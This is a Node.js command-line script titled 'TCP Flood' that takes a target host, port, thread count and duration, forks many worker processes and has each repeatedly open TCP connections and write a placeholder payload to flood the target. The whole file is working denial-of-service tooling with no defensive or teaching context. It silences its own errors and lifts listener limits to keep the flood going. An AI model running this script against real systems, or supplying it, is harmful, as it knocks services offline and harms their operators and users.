process.on('uncaughtException', function(er) {
    // console.log(er);
});
process.on('unhandledRejection', function(er) {
    // console.log(er);
});

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const net = require('net');
const cluster = require('cluster');

if(process.argv.length < 5) {
    console.log(`(!) TCP Flood - v1.1`);
    console.log(`(!) Updated by 23.05.22`);
    console.log(`(!) Usage: ./tcp <target> <port> <threads> <time>`);
}

const target = process.argv[2];
const port = process.argv[3];
const threads = process.argv[4];
const time = process.argv[5];

process.setMaxListeners(0);

if (cluster.isMaster) {
    for(let i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`(!) Creating ${i} thread`);
    }

    console.log(`(!) Successfully started.`);

    setTimeout(() => {
        process.exit(1);
    }, time * 1000);

} else {
    startflood();
}

function startflood() {
    setInterval(() => {
        const client = new net.Socket();

        client.connect(port, target, () => {
            for(let i = 0; i < 128; i++) {
                client.write("write ur payload skid");
            }
        });

        client.on('data', () => {
            setTimeout(() => {
                client.destroy();
                return delete client;
            }, 5000);
        });

    });
}